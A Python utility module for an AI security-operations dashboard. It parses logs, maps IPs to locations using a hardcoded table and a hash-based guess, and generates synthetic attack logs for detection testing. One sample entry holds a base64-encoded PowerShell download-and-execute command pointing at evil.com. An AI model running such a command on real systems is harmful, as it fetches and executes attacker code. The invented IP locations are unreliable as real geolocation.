"""
Utility functions for AI SOC Assistant: Log Parsing, GeoIP Resolution, and Synthetic Dataset Generation.
"""

import re
import json
import io
import random
from datetime import datetime, timedelta
from pathlib import Path
from typing import Tuple, Dict, Any, List
import pandas as pd
import streamlit as st

from config import UPLOAD_LIMITS

IP_GEO_DB = {
    "185.220.101.5": {"country": "Germany", "city": "Frankfurt", "lat": 50.1109, "lon": 8.6821, "isp": "Tor Exit Node"},
    "192.168.1.105": {"country": "Internal LAN", "city": "LAN Workplace", "lat": 37.751, "lon": -97.822, "isp": "Corporate Subnet"},
    "103.15.28.1": {"country": "Japan", "city": "Tokyo", "lat": 35.6762, "lon": 139.6503, "isp": "NTT Communications"},
    "198.51.100.4": {"country": "United States", "city": "New York", "lat": 40.7128, "lon": -74.0060, "isp": "Cloud Provider"},
    "45.33.32.156": {"country": "China", "city": "Beijing", "lat": 39.9042, "lon": 116.4074, "isp": "Unassigned Net"},
    "194.26.29.90": {"country": "Russia", "city": "Moscow", "lat": 55.7558, "lon": 37.6173, "isp": "Hosting Provider"},
    "10.0.0.45": {"country": "Internal LAN", "city": "DC Server Room", "lat": 37.751, "lon": -97.822, "isp": "Core Gateway"},
}

STANDARD_COLUMNS = ["timestamp", "event_type", "username", "src_ip", "dest_ip", "port", "status", "message", "location"]
SAMPLE_LOGS_DIR = Path(__file__).parent / "sample_logs"


def is_internal_location(country: str) -> bool:
    return country in {"Internal LAN", "Internal"}


def validate_upload(file_content: bytes) -> None:
    """Raise ValueError if upload exceeds configured size limits."""
    if len(file_content) > UPLOAD_LIMITS["max_bytes"]:
        max_mb = UPLOAD_LIMITS["max_bytes"] // (1024 * 1024)
        raise ValueError(f"File exceeds maximum upload size of {max_mb} MB.")


def parse_log_file(file_content: bytes, filename: str) -> pd.DataFrame:
    """Parses CSV, TXT, LOG, or JSON log files and normalizes them into a standard DataFrame."""
    validate_upload(file_content)
    file_ext = filename.split(".")[-1].lower() if "." in filename else "txt"
    text_content = file_content.decode("utf-8", errors="replace")

    if file_ext == "csv":
        df = pd.read_csv(io.StringIO(text_content))
        return _normalize_dataframe(df)

    elif file_ext == "json":
        try:
            data = json.loads(text_content)
            if isinstance(data, list):
                df = pd.DataFrame(data)
            else:
                df = pd.DataFrame([data])
            return _normalize_dataframe(df)
        except Exception:
            lines = [json.loads(line) for line in text_content.strip().split("\n") if line.strip()]
            return _normalize_dataframe(pd.DataFrame(lines))

    else:
        parsed_rows = []
        log_pattern = re.compile(
            r'(?P<timestamp>\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}:\d{2}(?:\.\d+)?)\s+'
            r'(?:\[(?P<status>FAILED|SUCCESS|WARN|INFO|CRITICAL)\]\s+)?'
            r'(?:(?P<event_type>[\w\.\-]+)\s+)?'
            r'(?:user=(?P<username>[\w\.\-\\]+)\s+)?'
            r'(?:src=(?P<src_ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+)?'
            r'(?:dst=(?P<dest_ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+)?'
            r'(?:port=(?P<port>\d+)\s+)?'
            r'(?P<message>.*)'
        )

        for line in text_content.splitlines():
            line = line.strip()
            if not line:
                continue

            match = log_pattern.search(line)
            if match:
                row = match.groupdict()
                parsed_rows.append(row)
            else:
                ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line)
                user_match = re.search(r'user\s+([\w\.\-]+)', line, re.IGNORECASE)
                parsed_rows.append({
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "event_type": "Syslog Event",
                    "username": user_match.group(1) if user_match else "system",
                    "src_ip": ip_match.group(0) if ip_match else "127.0.0.1",
                    "dest_ip": "10.0.0.1",
                    "port": 443,
                    "status": "FAILED" if "fail" in line.lower() else "INFO",
                    "message": line
                })

        df = pd.DataFrame(parsed_rows)
        return _normalize_dataframe(df)


def load_sample_log(filename: str) -> pd.DataFrame:
    """Load a bundled sample log file from the sample_logs directory."""
    path = SAMPLE_LOGS_DIR / filename
    if not path.exists():
        raise FileNotFoundError(f"Sample log not found: {filename}")
    return parse_log_file(path.read_bytes(), filename)


@st.cache_data(show_spinner=False)
def _cached_run_detections(logs_json: str, thresholds_tuple: tuple) -> list:
    """Cache detection results keyed on log content and threshold settings."""
    from analyzer import SOCAnalyzer

    df = pd.read_json(io.StringIO(logs_json))
    df["timestamp"] = pd.to_datetime(df["timestamp"])
    analyzer = SOCAnalyzer(dict(thresholds_tuple))
    return analyzer.run_all_detections(df)


def dataframe_to_cache_key(df: pd.DataFrame) -> str:
    """Serialize dataframe for use as a cache key."""
    export_df = df.copy()
    export_df["timestamp"] = export_df["timestamp"].astype(str)
    return export_df.to_json(orient="records")


def run_detections_cached(df: pd.DataFrame, thresholds_tuple: tuple) -> list:
    """Run cached detections for a live dataframe."""
    if len(df) > UPLOAD_LIMITS["max_rows"]:
        df = df.head(UPLOAD_LIMITS["max_rows"])
    return _cached_run_detections(dataframe_to_cache_key(df), thresholds_tuple)


def _normalize_dataframe(df: pd.DataFrame) -> pd.DataFrame:
    col_mapping = {
        'time': 'timestamp', 'date': 'timestamp', 'datetime': 'timestamp',
        'event': 'event_type', 'type': 'event_type', 'action': 'event_type',
        'user': 'username', 'account': 'username', 'user_id': 'username',
        'ip': 'src_ip', 'source_ip': 'src_ip', 'client_ip': 'src_ip',
        'destination_ip': 'dest_ip', 'target_ip': 'dest_ip',
        'result': 'status', 'outcome': 'status', 'severity': 'status',
        'msg': 'message', 'description': 'message', 'details': 'message',
        'dst_port': 'port', 'target_port': 'port'
    }

    df.rename(columns=lambda col: col_mapping.get(col.lower().strip(), col.lower().strip()), inplace=True)

    for col in STANDARD_COLUMNS:
        if col not in df.columns:
            if col == "status":
                df[col] = "INFO"
            elif col == "port":
                df[col] = 443
            elif col == "location":
                df[col] = "Unknown"
            else:
                df[col] = "N/A"

    df['timestamp'] = pd.to_datetime(df['timestamp'], errors='coerce')
    df['timestamp'] = df['timestamp'].fillna(pd.Timestamp.now())
    df.sort_values(by='timestamp', inplace=True)
    if len(df) > UPLOAD_LIMITS["max_rows"]:
        df = df.head(UPLOAD_LIMITS["max_rows"])
    df['location'] = df['src_ip'].apply(lambda ip: get_ip_location(str(ip))['country'])

    return df[STANDARD_COLUMNS]


def get_ip_location(ip: str) -> Dict[str, Any]:
    if ip in IP_GEO_DB:
        return IP_GEO_DB[ip]
    
    if ip.startswith("10.") or ip.startswith("192.168.") or ip.startswith("172.16.") or ip == "127.0.0.1":
        return {"country": "Internal LAN", "city": "Local Network", "lat": 37.751, "lon": -97.822, "isp": "Corporate Intranet"}

    hash_val = sum(int(x) for x in ip.split('.') if x.isdigit())
    countries = [
        ("United States", 37.0902, -95.7129),
        ("Germany", 51.1657, 10.4515),
        ("Japan", 36.2048, 138.2529),
        ("United Kingdom", 55.3781, -3.4360),
        ("France", 46.2276, 2.2137),
        ("Brazil", -14.2350, -51.9253),
        ("Netherlands", 52.1326, 5.2913),
        ("Singapore", 1.3521, 103.8198),
        ("South Korea", 35.9078, 127.7669)
    ]
    selected = countries[hash_val % len(countries)]
    return {"country": selected[0], "city": "External Gateway", "lat": selected[1], "lon": selected[2], "isp": "Telecom Operator"}


def generate_sample_logs() -> pd.DataFrame:
    now = datetime.now()
    base_time = now - timedelta(hours=4)
    logs = []

    legit_users = ["alice.m", "bob.k", "charlie.w", "david.h", "support_tech"]
    legit_ips = ["192.168.1.10", "192.168.1.25", "192.168.1.50", "192.168.1.105"]
    
    for i in range(45):
        t = base_time + timedelta(seconds=i * 250)
        logs.append({
            "timestamp": t.strftime("%Y-%m-%d %H:%M:%S"),
            "event_type": random.choice(["USER_LOGIN", "HTTP_GET", "FILE_ACCESS", "API_REQUEST"]),
            "username": random.choice(legit_users),
            "src_ip": random.choice(legit_ips),
            "dest_ip": "10.0.0.5",
            "port": random.choice([80, 443, 8080, 22]),
            "status": "SUCCESS",
            "message": "Authenticated user session active."
        })

    bf_start = base_time + timedelta(minutes=20)
    for i in range(12):
        t = bf_start + timedelta(seconds=i * 15)
        logs.append({
            "timestamp": t.strftime("%Y-%m-%d %H:%M:%S"),
            "event_type": "AUTHENTICATION_FAILED",
            "username": random.choice(["root", "admin", "administrator", "postgres", "user"]),
            "src_ip": "185.220.101.5",
            "dest_ip": "10.0.0.12",
            "port": 22,
            "status": "FAILED",
            "message": "SSH login failure for root: Invalid credentials provided."
        })

    logs.append({
        "timestamp": (bf_start + timedelta(seconds=12 * 15 + 5)).strftime("%Y-%m-%d %H:%M:%S"),
        "event_type": "USER_LOGIN",
        "username": "admin",
        "src_ip": "185.220.101.5",
        "dest_ip": "10.0.0.12",
        "port": 22,
        "status": "SUCCESS",
        "message": "SSH Authentication Accepted for admin from 185.220.101.5"
    })

    ps_start = base_time + timedelta(minutes=45)
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 8080]
    for p in ports:
        t = ps_start + timedelta(seconds=ports.index(p) * 2)
        logs.append({
            "timestamp": t.strftime("%Y-%m-%d %H:%M:%S"),
            "event_type": "PORT_SCAN",
            "username": "N/A",
            "src_ip": "45.33.32.156",
            "dest_ip": "10.0.0.15",
            "port": p,
            "status": "REJECTED",
            "message": f"TCP Connection SYN probe to port {p} blocked by firewall."
        })

    psh_time = base_time + timedelta(hours=1, minutes=15)
    logs.append({
        "timestamp": psh_time.strftime("%Y-%m-%d %H:%M:%S"),
        "event_type": "PROCESS_EXECUTION",
        "username": "admin_dev",
        "src_ip": "192.168.1.105",
        "dest_ip": "10.0.0.45",
        "port": 445,
        "status": "WARN",
        "message": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
    })

    t1 = base_time + timedelta(hours=2)
    t2 = base_time + timedelta(hours=2, minutes=12)
    logs.append({
        "timestamp": t1.strftime("%Y-%m-%d %H:%M:%S"),
        "event_type": "CLOUD_LOGIN",
        "username": "j.smith@corp.com",
        "src_ip": "103.15.28.1",
        "dest_ip": "13.107.42.16",
        "port": 443,
        "status": "SUCCESS",
        "message": "Single Sign-On login accepted from Tokyo, Japan"
    })
    logs.append({
        "timestamp": t2.strftime("%Y-%m-%d %H:%M:%S"),
        "event_type": "CLOUD_LOGIN",
        "username": "j.smith@corp.com",
        "src_ip": "198.51.100.4",
        "dest_ip": "13.107.42.16",
        "port": 443,
        "status": "SUCCESS",
        "message": "Single Sign-On login accepted from New York, USA"
    })

    pe_time = base_time + timedelta(hours=2, minutes=45)
    logs.append({
        "timestamp": pe_time.strftime("%Y-%m-%d %H:%M:%S"),
        "event_type": "PRIVILEGE_ESCALATION",
        "username": "svc_sql",
        "src_ip": "10.0.0.45",
        "dest_ip": "10.0.0.5",
        "port": 88,
        "status": "CRITICAL",
        "message": "Event ID 4672: Special privileges assigned to new logon. Mimikatz LSASS memory dump attempt detected."
    })

    logs.append({
        "timestamp": (pe_time + timedelta(minutes=5)).strftime("%Y-%m-%d %H:%M:%S"),
        "event_type": "ACCOUNT_LOCKOUT",
        "username": "svc_sql",
        "src_ip": "10.0.0.45",
        "dest_ip": "10.0.0.5",
        "port": 88,
        "status": "CRITICAL",
        "message": "Event ID 4740: User Account 'svc_sql' was locked out due to anomalous privilege escalation guard rails."
    })

    df = pd.DataFrame(logs)
    return _normalize_dataframe(df)
